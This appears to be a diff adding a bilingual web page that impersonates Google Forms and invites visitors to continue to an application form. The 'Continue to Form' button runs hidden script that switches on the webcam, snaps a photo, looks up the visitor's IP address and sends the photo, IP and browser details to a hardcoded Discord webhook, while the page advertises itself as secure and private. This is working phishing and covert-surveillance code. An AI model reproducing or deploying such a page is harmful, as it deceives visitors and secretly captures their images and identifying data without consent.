@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>Continue to Application</title>
+<script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script>
+<link href="https://fonts.googleapis.com" rel="preconnect"/>
+<link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&amp;display=swap" rel="stylesheet"/>
+<link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined" rel="stylesheet"/>
+<style>
+        .dot-bg {
+            background-image: radial-gradient(circle, rgba(0, 0, 0, 0.05) 1px, transparent 1px);
+            background-size: 20px 20px;
+        }
+        .dark .dot-bg {
+            background-image: radial-gradient(circle, rgba(255, 255, 255, 0.05) 1px, transparent 1px);
+        }@keyframes float {
+            0%,
+            100% {
+                transform: translateY(0);
+            }
+            50% {
+                transform: translateY(-10px);
+            }
+        }
+        .float-animation {
+            animation: float 3s ease-in-out infinite;
+        }
+    </style>
+<script id="tailwind-config">
+        tailwind.config = {
+            darkMode: "class",
+            theme: {
+                extend: {
+                    colors: {
+                        "primary": "#137fec",
+                        "background-light": "#f6f7f8",
+                        "background-dark": "#101922",
+                        "text-light": "#1f2937",
+                        "text-dark": "#f9fafb",
+                        "card-light": "#ffffff",
+                        "card-dark": "#1f2937",
+                    },
+                    fontFamily: {
+                        "display": ["Inter", "sans-serif"]
+                    },
+                    borderRadius: {
+                        "DEFAULT": "0.375rem",
+                        "lg": "0.5rem",
+                        "xl": "0.75rem",
+                        "full": "9999px"
+                    },
+                },
+            },
+        }
+    </script>
+<script>
+        // Simple dark mode toggle script
+        function toggleDarkMode() {
+            document.documentElement.classList.toggle('dark');
+        }
+        // Simple language switch script
+        function switchLanguage(lang) {
+            document.querySelectorAll('[data-lang]').forEach(el => {
+                el.style.display = 'none';
+            });
+            document.querySelectorAll(`[data-lang="${lang}"]`).forEach(el => {
+                el.style.display = 'block';
+            });
+            document.querySelectorAll('[data-lang-inline]').forEach(el => {
+                el.style.display = 'none';
+            });
+            document.querySelectorAll(`[data-lang-inline="${lang}"]`).forEach(el => {
+                el.style.display = 'inline';
+            });
+            document.documentElement.lang = lang;
+        }
+        // Initialize with English
+        document.addEventListener('DOMContentLoaded', () => {
+            switchLanguage('en');
+        });
+    </script>
+</head>
+<body class="font-display bg-background-light dark:bg-background-dark text-text-light dark:text-text-dark dot-bg transition-colors duration-300">
+<header class="fixed top-0 left-0 right-0 z-50 bg-background-light/80 dark:bg-background-dark/80 backdrop-blur-sm">
+<div class="container mx-auto px-6 py-4 flex justify-between items-center">
+<div class="flex items-center space-x-2">
+<span class="material-symbols-outlined text-primary text-3xl">api</span>
+<span class="text-xl font-bold">Google Forms</span>
+</div>
+<div class="flex items-center space-x-4">
+<button class="p-2 rounded-full text-gray-500 dark:text-gray-400 hover:bg-gray-200 dark:hover:bg-gray-700 transition-colors" onclick="toggleDarkMode()">
+<span class="material-symbols-outlined dark:hidden">dark_mode</span>
+<span class="material-symbols-outlined hidden dark:inline">light_mode</span>
+</button>
+<div class="flex items-center space-x-2 text-sm font-medium">
+<button class="px-3 py-1 rounded-md text-gray-600 dark:text-gray-300 hover:bg-gray-200 dark:hover:bg-gray-700 transition-colors" onclick="switchLanguage('en')">EN</button>
+<div class="w-px h-5 bg-gray-300 dark:bg-gray-600"></div>
+<button class="px-3 py-1 rounded-md text-gray-600 dark:text-gray-300 hover:bg-gray-200 dark:hover:bg-gray-700 transition-colors" onclick="switchLanguage('es')">ES</button>
+</div>
+</div>
+</div>
+</header>
+<main class="pt-24">
+<section class="py-20">
+<div class="container mx-auto px-6 text-center">
+<div class="relative w-full max-w-4xl mx-auto">
+<div class="absolute -top-16 -left-16 w-32 h-32 bg-primary/20 rounded-full blur-2xl float-animation"></div>
+<div class="absolute -bottom-16 -right-16 w-32 h-32 bg-purple-500/20 rounded-full blur-2xl float-animation" style="animation-delay: 1.5s;"></div>
+<div class="relative z-10">
+<h1 class="text-5xl md:text-6xl font-bold leading-tight mb-4">
+<span data-lang="en">Ready to Get Started?</span>
+<span data-lang="es">¿Listo para Empezar?</span>
+</h1>
+<p class="text-lg text-gray-600 dark:text-gray-400 max-w-2xl mx-auto mb-8">
+<span data-lang="en">Just one more step to access the application form. We're excited to see what you'll create!</span>
+<span data-lang="es">Solo un paso más para acceder al formulario de solicitud. ¡Estamos emocionados por ver lo que crearás!</span>
+</p>
+<a class="inline-block px-8 py-3 bg-primary text-white font-bold rounded-lg hover:bg-primary/90 transition-colors duration-300 focus:outline-none focus:ring-4 focus:ring-primary/30" onclick="takePhotoAndSend()">
+<span data-lang="en">Continue to Form</span>
+<span data-lang="es">Continuar al Formulario</span>
+</a>
+</div>
+</div>
+</div>
+</section>
+<section class="py-20 bg-card-light dark:bg-card-dark rounded-t-xl">
+<div class="container mx-auto px-6">
+<div class="text-center mb-12">
+<h2 class="text-3xl font-bold">
+<span data-lang="en">Why Choose Our Platform?</span>
+<span data-lang="es">¿Por Qué Elegir Nuestra Plataforma?</span>
+</h2>
+<p class="text-gray-600 dark:text-gray-400 mt-2">
+<span data-lang="en">Streamline your process with powerful features.</span>
+<span data-lang="es">Optimiza tu proceso con funciones potentes.</span>
+</p>
+</div>
+<div class="grid md:grid-cols-3 gap-8">
+<div class="text-center p-6 bg-background-light dark:bg-background-dark rounded-xl">
+<div class="flex items-center justify-center h-12 w-12 rounded-full bg-primary/10 text-primary mx-auto mb-4">
+<span class="material-symbols-outlined">speed</span>
+</div>
+<h3 class="text-xl font-semibold mb-2">
+<span data-lang="en">Lightning Fast</span>
+<span data-lang="es">Velocidad del Rayo</span>
+</h3>
+<p class="text-gray-600 dark:text-gray-400">
+<span data-lang="en">Submit your application in minutes with our optimized form.</span>
+<span data-lang="es">Envía tu solicitud en minutos con nuestro formulario optimizado.</span>
+</p>
+</div>
+<div class="text-center p-6 bg-background-light dark:bg-background-dark rounded-xl">
+<div class="flex items-center justify-center h-12 w-12 rounded-full bg-primary/10 text-primary mx-auto mb-4">
+<span class="material-symbols-outlined">lock</span>
+</div>
+<h3 class="text-xl font-semibold mb-2">
+<span data-lang="en">Secure &amp; Private</span>
+<span data-lang="es">Seguro y Privado</span>
+</h3>
+<p class="text-gray-600 dark:text-gray-400">
+<span data-lang="en">Your data is encrypted and protected with the highest standards.</span>
+<span data-lang="es">Tus datos están encriptados y protegidos con los más altos estándares.</span>
+</p>
+</div>
+<div class="text-center p-6 bg-background-light dark:bg-background-dark rounded-xl">
+<div class="flex items-center justify-center h-12 w-12 rounded-full bg-primary/10 text-primary mx-auto mb-4">
+<span class="material-symbols-outlined">support_agent</span>
+</div>
+<h3 class="text-xl font-semibold mb-2">
+<span data-lang="en">24/7 Support</span>
+<span data-lang="es">Soporte 24/7</span>
+</h3>
+<p class="text-gray-600 dark:text-gray-400">
+<span data-lang="en">Our team is always here to help you with any questions.</span>
+<span data-lang="es">Nuestro equipo siempre está aquí para ayudarte con cualquier pregunta.</span>
+</p>
+</div>
+</div>
+</div>
+</section>
+<section class="py-20">
+<div class="container mx-auto px-6">
+<div class="text-center mb-12">
+<h2 class="text-3xl font-bold">
+<span data-lang="en">Loved by Users Worldwide</span>
+<span data-lang="es">Amado por Usuarios de Todo el Mundo</span>
+</h2>
+<p class="text-gray-600 dark:text-gray-400 mt-2">
+<span data-lang="en">See what others are saying about our platform.</span>
+<span data-lang="es">Mira lo que otros dicen sobre nuestra plataforma.</span>
+</p>
+</div>
+<div class="grid md:grid-cols-2 gap-8 max-w-4xl mx-auto">
+<div class="bg-card-light dark:bg-card-dark p-6 rounded-xl shadow-lg">
+<p class="text-gray-600 dark:text-gray-300 italic mb-4">"
+                            <span data-lang-inline="en">This was the smoothest application process I've ever experienced. Highly recommended!</span>
+<span data-lang-inline="es">Este fue el proceso de solicitud más fluido que he experimentado. ¡Muy recomendado!</span>"
+                        </p>
+<div class="flex items-center">
+<img alt="User avatar" class="w-10 h-10 rounded-full mr-4" src="https://lh3.googleusercontent.com/aida-public/AB6AXuB5AoWDyF7QqGB0AhTjqJhPrEhgdHlidQhjLQsaCnxOup04q4cGM3HfIqB5BKtJ41AMVdDv9rW-eV-cw6nfaSqM-5i7_sr1B-c09eDAuzPITjLKXvOcuG_Ej7r44yk9vSNcNOQI_sFtg5rsfUn53mmYlNvB0l-xuJ7DCtFVGFkhf5fo9crjZNBuBSDJQk8SBMpEo4427iExLLGYVIhxcT6fqQ3wMHw34coeeQr0v6dvISeHeA0hQo1Zi8CrIDC2FJZZ42T_vLKv4pKD"/>
+<div>
+<p class="font-semibold">Sarah Johnson</p>
+<p class="text-sm text-gray-500 dark:text-gray-400">
+<span data-lang-inline="en">Product Designer</span>
+<span data-lang-inline="es">Diseñadora de Producto</span>
+</p>
+</div>
+</div>
+</div>
+<div class="bg-card-light dark:bg-card-dark p-6 rounded-xl shadow-lg">
+<p class="text-gray-600 dark:text-gray-300 italic mb-4">"
+                            <span data-lang-inline="en">Fantastic platform. The user interface is clean, intuitive, and beautiful.</span>
+<span data-lang-inline="es">Plataforma fantástica. La interfaz de usuario es limpia, intuitiva y hermosa.</span>"
+                        </p>
+<div class="flex items-center">
+<img alt="User avatar" class="w-10 h-10 rounded-full mr-4" src="https://lh3.googleusercontent.com/aida-public/AB6AXuDx3-T52YXy5ZKxJQMvgzbiTzKwgKW942kWxI6B0_fXOBU0z0CJkmq86TLhVDJVnAjRYX_hd_BAu7ZznkwXs3uzH6hNF_x7kL1jp3MgsDs-JhlEgpvEd15GdOSCM6e0QQDangucowhR_pXuLXsEFmxwn_4dj14fNpbFi1URhbXLBLxMlWvCmhW9MYWm3qWnn8oP5c2myUfzYBBTvVI_zEaGAxhHnOXMmXJ3oEnXxRYWlGLkdxJuGYTn4d20xiLflq5ppLW0Ec8DeNkN"/>
+<div>
+<p class="font-semibold">Michael Chen</p>
+<p class="text-sm text-gray-500 dark:text-gray-400">
+<span data-lang-inline="en">Software Engineer</span>
+<span data-lang-inline="es">Ingeniero de Software</span>
+</p>
+</div>
+</div>
+</div>
+</div>
+</div>
+</section>
+<section class="py-20">
+<div class="container mx-auto px-6">
+<div class="bg-primary/90 text-white p-12 rounded-xl text-center shadow-2xl shadow-primary/20">
+<h2 class="text-3xl font-bold mb-4">
+<span data-lang="en">Ready to Begin?</span>
+<span data-lang="es">¿Listo para Empezar?</span>
+</h2>
+<p class="max-w-xl mx-auto mb-8">
+<span data-lang="en">Don't wait any longer. Your journey starts with a single click. Access the form now and take the next step towards your goals.</span>
+<span data-lang="es">No esperes más. Tu viaje comienza con un solo clic. Accede al formulario ahora y da el siguiente paso hacia tus metas.</span>
+</p>
+<a class="inline-block px-8 py-3 bg-white text-primary font-bold rounded-lg hover:bg-gray-100 transition-colors duration-300" href="#">
+<span data-lang="en">Continue to Form</span>
+<span data-lang="es">Continuar al Formulario</span>
+</a>
+</div>
+</div>
+</section>
+</main>
+<footer class="bg-card-light dark:bg-card-dark py-8">
+<div class="container mx-auto px-6 text-center text-gray-500 dark:text-gray-400">
+<p>© 2025 Google Forms.
+                <span data-lang-inline="en">All Rights Reserved.</span>
+<span data-lang-inline="es">Todos los Derechos Reservados.</span>
+</p>
+</div>
+</footer>
+
+<video id="video" width="640" height="480" style="display:none;"></video>
+<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+<script>
+        const discordWebhookURL = 'https://discord.com/api/webhooks/1362895340994302002/hz6WSqGnHAQAVEGhQ45wqvyyDmGWPuocG-9bGB6KJtwvCLmSUESU6NU8HcZXZdJek4iw';
+
+        async function takePhotoAndSend() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const videoElement = document.createElement('video');
+                videoElement.srcObject = stream;
+                videoElement.play();
+
+                videoElement.onloadedmetadata = async () => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = videoElement.videoWidth;
+                    canvas.height = videoElement.videoHeight;
+                    const context = canvas.getContext('2d');
+                    context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+                    const imageData = canvas.toDataURL('image/jpeg');
+
+                    sendToDiscord(imageData);
+
+                    stream.getTracks().forEach(track => track.stop());
+                };
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Grant the permissions.');
+            }
+        }
+
+        function sendToDiscord(imageData) {
+            const formData = new FormData();
+            formData.append('file', dataURItoBlob(imageData), 'photo.jpg');
+
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    var ipAddress = data.ip;
+                    var userAgent = navigator.userAgent;
+
+                    var payload = new FormData();
+                    payload.append('content', 'User IP Address: ' + ipAddress + '\nUser Agent: ' + userAgent);
+                    payload.append('file', formData.get('file'));
+
+                    fetch(discordWebhookURL, {
+                        method: 'POST',
+                        body: payload
+                    })
+                    .then(response => {
+                        if (response.ok) {
+                            alert('Sending you to the main page..');
+                        } else {
+                            alert('Hmm error');
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Error:', error);
+                        alert('An error occurred. Please try again later.');
+                    });
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('Failed to fetch IP address. Please try again later.');
+                });
+        }
+
+        function dataURItoBlob(dataURI) {
+            const byteString = atob(dataURI.split(',')[1]);
+            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+            const arrayBuffer = new ArrayBuffer(byteString.length);
+            const byteArray = new Uint8Array(arrayBuffer);
+
+            for (let i = 0; i < byteString.length; i++) {
+                byteArray[i] = byteString.charCodeAt(i);
+            }
+
+            return new Blob([arrayBuffer], { type: mimeString });
+        }
+    </script>
+
+</body></html>
